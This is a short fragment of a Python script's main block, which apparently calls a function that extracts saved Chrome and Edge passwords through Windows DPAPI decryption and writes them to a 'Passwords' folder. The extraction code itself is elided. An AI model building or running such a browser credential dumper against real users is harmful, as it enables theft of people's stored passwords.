...
if __name__ == "__main__":
    if os.name == "nt":
        ...
        print("Info: Close Chrome/Edge and disable background apps.")
        print("Warn: Accessing passwords requires proper user permissions.")
    else:
        print("Warn: This script is tailored for Windows DPAPI decryption (Windows only).")
    get_browser_passwords(output_dir="Passwords")